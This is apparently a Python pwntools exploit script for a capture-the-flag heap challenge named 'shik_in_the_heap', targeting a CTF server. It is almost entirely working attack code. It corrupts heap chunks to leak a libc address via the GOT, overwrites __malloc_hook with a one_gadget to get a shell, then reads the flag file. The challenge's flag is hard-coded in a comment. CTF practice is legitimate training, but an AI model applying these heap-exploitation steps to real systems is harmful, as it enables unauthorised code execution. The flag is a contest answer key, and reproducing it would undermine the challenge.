#!/usr/bin/env python
from pwn import *

# FLAG{Sh1K_1n_7He_H34P~~}

e , l = ELF( './shik_in_the_heap-c91232e1d722aabfe747fcc5b22ed38a674fa3d8' ) , ELF( './libc.so.6-14c22be9aa11316f89909e4237314e009da38883' )

host , port = 'csie.ctf.tw' , 10143
y = remote( host , port )


def alloc( size , data  , yuawn = False):
    y.sendafter( 'ice:' , '1' )
    y.sendafter( ':' , str( size ) )
    if yuawn:
        sleep( 0.7 )
        y.sendline( 'cat /home/`whoami`/flag' )
        y.interactive()
    y.sendafter( ':' , data )

def free( idx ):
    y.sendafter( 'ice:' , '2' )
    y.sendafter( ':' , str( idx ) )

def add_shik( data ):
    y.sendafter( 'ice:' , '3' )
    y.sendafter( ':' , data )

def show_shik():
    y.sendafter( 'ice:' , '4' )

def edit_shik( data ):
    y.sendafter( 'ice:' , '5' )
    y.sendafter( '' , data )


alloc( 0x68 , 'yuawn' )
alloc( 0x160 , 'Y' * 0xf0 + p64( 0x100 ) )
alloc( 0x200 , 'yuawn' )
alloc( 0x200 , 'yuawn' )

free( 1 )
free( 0 )

alloc( 0x68 , 'Y' * 0x60 + p64( 0 ) )

alloc( 0x88 , 'A' * 0x80 )
add_shik( 'D' * 0x1f )

free( 1 )
free( 2 )

alloc( 0x370 , 'Y' * 0x90 + p64( e.got['__libc_start_main'] ) )

show_shik()
y.recvuntil( 'Magic: ' )
l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - l.symbols['__libc_start_main']
log.success( 'libc -> %s' % hex( l.address ) )


free( 1 )
alloc( 0x370 , 'Y' * 0x90 + p64( l.symbols['__malloc_hook'] ) )

one = 0x4526a

edit_shik( p64( l.address + one ) )

alloc( 0x7777777 , 'yuawn' , yuawn = True )
